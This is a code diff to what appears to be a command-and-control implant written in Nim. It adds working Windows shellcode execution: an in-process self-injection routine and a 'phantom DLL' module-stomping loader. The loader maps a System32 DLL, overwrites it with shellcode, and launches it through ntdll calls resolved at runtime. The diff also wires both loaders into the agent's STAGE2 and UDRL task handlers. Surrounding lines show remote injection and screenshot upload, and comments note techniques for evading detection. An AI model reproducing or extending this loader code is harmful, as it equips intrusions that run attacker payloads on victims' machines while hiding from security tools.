@@ -164,6 +164,116 @@ when defined(windows):
         bmpFile[d+3] = pixels[s+3]
     return (bmpFile, false)
 
+  # ── In-process shellcode execution (STAGE2) ──────────────────────────────────
+  proc doSelfInject(sc: seq[byte]): string =
+    let mem = VirtualAlloc(nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    if mem == nil: return "[-] VirtualAlloc failed (err " & $GetLastError() & ")"
+    copyMem(mem, unsafeAddr sc[0], sc.len)
+    var old: DWORD = 0
+    discard VirtualProtect(mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
+    let ht = callCreateThread(nil, 0, mem, nil, 0, nil)
+    if ht == 0: return "[-] CreateThread failed (err " & $GetLastError() & ")"
+    discard callCloseHandle(ht)
+    "[+] self-inject: " & $sc.len & " bytes \xe2\x86\x92 executing"
+
+  # ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────
+  proc phantomLoad(sc: seq[byte]): string =
+    if sc.len == 0: return "[-] phantomLoad: empty shellcode"
+    let sysRoot = getEnvCmd("SystemRoot", "C:\\Windows")
+    var hostPath = ""
+    for name in [sysRoot & "\\System32\\xpsservices.dll",
+                 sysRoot & "\\System32\\clbcatq.dll",
+                 sysRoot & "\\System32\\msasn1.dll"]:
+      if fileExists(name): hostPath = name; break
+    if hostPath.len == 0: return "[-] phantomLoad: no host DLL found"
+
+    let ntdll = GetModuleHandleA("ntdll.dll")
+    if ntdll == 0: return "[-] phantomLoad: GetModuleHandleA(ntdll) failed"
+
+    type
+      NtCreateSection_t    = proc(H: ptr HANDLE; Acc: DWORD; Oa: pointer; MaxSz: pointer;
+                                  Prot: ULONG; Attr: ULONG; Fh: HANDLE): NTSTATUS {.stdcall.}
+      NtMapViewOfSection_t = proc(Sec: HANDLE; Proc: HANDLE; Base: ptr pointer;
+                                  Bits: ULONG_PTR; Csz: SIZE_T; Off: pointer;
+                                  Vsz: ptr SIZE_T; Inh: ULONG; At: ULONG; Prot: ULONG): NTSTATUS {.stdcall.}
+      NtProtectVM_t        = proc(Proc: HANDLE; Base: ptr pointer; Sz: ptr SIZE_T;
+                                  NewProt: ULONG; OldProt: ptr ULONG): NTSTATUS {.stdcall.}
+      NtCreateThreadEx_t   = proc(H: ptr HANDLE; Acc: DWORD; Oa: pointer; Proc: HANDLE;
+                                  Start: pointer; Param: pointer; Flags: ULONG;
+                                  Zb: SIZE_T; SzC: SIZE_T; SzR: SIZE_T; Bb: pointer): NTSTATUS {.stdcall.}
+
+    let pfnCS     = cast[NtCreateSection_t]   (GetProcAddress(ntdll, "NtCreateSection"))
+    let pfnMap    = cast[NtMapViewOfSection_t](GetProcAddress(ntdll, "NtMapViewOfSection"))
+    let pfnProt   = cast[NtProtectVM_t]       (GetProcAddress(ntdll, "NtProtectVirtualMemory"))
+    let pfnThread = cast[NtCreateThreadEx_t]  (GetProcAddress(ntdll, "NtCreateThreadEx"))
+    if pfnCS == nil or pfnMap == nil or pfnProt == nil:
+      return "[-] phantomLoad: ntdll resolve failed"
+
+    # NtOpenFile — NT namespace path \??\...
+    let ntPath  = "\\??\\" & hostPath
+    var pathW   = newWideCString(ntPath)
+    var ustr    = UNICODE_STRING(
+      Length:        USHORT(ntPath.len * 2),
+      MaximumLength: USHORT(ntPath.len * 2 + 2),
+      Buffer:        cast[PWSTR](addr pathW[0]))
+    var oa: OBJECT_ATTRIBUTES
+    InitializeObjectAttributes(addr oa, addr ustr, OBJ_CASE_INSENSITIVE, 0, nil)
+    var isb: IO_STATUS_BLOCK
+    var fileH: HANDLE = 0
+    let stOpen = NtOpenFile(addr fileH,
+                            GENERIC_READ or FILE_EXECUTE or SYNCHRONIZE,
+                            addr oa, addr isb,
+                            FILE_SHARE_READ or FILE_SHARE_DELETE,
+                            0x00000020 or 0x00000040) # SYNC_IO | NON_DIR
+    if stOpen != 0 or fileH == 0:
+      return "[-] NtOpenFile: 0x" & toHex(uint32(stOpen), 8)
+    defer: discard NtClose(fileH)
+
+    # NtCreateSection SEC_IMAGE
+    var secH: HANDLE = 0
+    let st2 = pfnCS(addr secH, SECTION_ALL_ACCESS, nil, nil, PAGE_READONLY, SEC_IMAGE, fileH)
+    if st2 != 0 or secH == 0:
+      return "[-] NtCreateSection: 0x" & toHex(uint32(st2), 8)
+    defer: discard NtClose(secH)
+
+    # NtMapViewOfSection CoW
+    var mappedBase: pointer = nil
+    var viewSize: SIZE_T = 0
+    var st3 = pfnMap(secH, GetCurrentProcess(), addr mappedBase, 0, 0, nil,
+                     addr viewSize, 1, 0, PAGE_EXECUTE_WRITECOPY)
+    if st3 != 0:
+      mappedBase = nil; viewSize = 0
+      st3 = pfnMap(secH, GetCurrentProcess(), addr mappedBase, 0, 0, nil,
+                   addr viewSize, 1, 0, PAGE_EXECUTE_READ)
+      if st3 != 0:
+        return "[-] NtMapViewOfSection: 0x" & toHex(uint32(st3), 8)
+
+    var writeSize = SIZE_T(sc.len)
+    if writeSize > viewSize: writeSize = viewSize
+
+    # RW → CoW triggers private pages
+    var oldProt: ULONG = 0
+    var bptr = mappedBase; var ws = writeSize
+    discard pfnProt(GetCurrentProcess(), addr bptr, addr ws, PAGE_READWRITE, addr oldProt)
+    copyMem(mappedBase, unsafeAddr sc[0], int(writeSize))
+
+    # RX — never RWX
+    bptr = mappedBase; ws = writeSize
+    discard pfnProt(GetCurrentProcess(), addr bptr, addr ws, PAGE_EXECUTE_READ, addr oldProt)
+
+    # Execute
+    if pfnThread != nil:
+      var hThr: HANDLE = 0
+      discard pfnThread(addr hThr, 0x1FFFFF, nil, GetCurrentProcess(),
+                        mappedBase, nil, 0, 0, 0, 0, nil)
+      if hThr != 0: discard NtClose(hThr)
+    else:
+      let ht = callCreateThread(nil, 0, mappedBase, nil, 0, nil)
+      if ht != 0: discard callCloseHandle(ht)
+
+    "[+] phantomLoad: host=" & hostPath & " mapped=0x" &
+      toHex(cast[uint64](mappedBase), 16) & " sc=" & $sc.len & " B \xe2\x86\x92 executing"
+
   # ── Remote thread injection ──────────────────────────────────────────────────
   proc doInjectRemote(pid: int; sc: seq[byte]): string =
     # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
@@ -1501,6 +1611,20 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       let ext = when defined(windows): ".bmp" else: ".png"
       t.uploadFile(id, "screenshot" & ext, data)
       t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")
+
+  of "STAGE2":
+    when defined(windows):
+      if payload.len == 0: t.sendResult(id, "", "STAGE2: no shellcode payload"); return
+      t.sendResult(id, doSelfInject(payload), "")
+    else:
+      t.sendResult(id, "", "STAGE2: not supported on Linux")
+
+  of "UDRL":
+    when defined(windows):
+      if payload.len == 0: t.sendResult(id, "", "UDRL: no shellcode payload"); return
+      t.sendResult(id, phantomLoad(payload), "")
+    else:
+      t.sendResult(id, "", "UDRL: not supported on Linux")
 
   of "INJECT_REMOTE":
     when defined(windows):
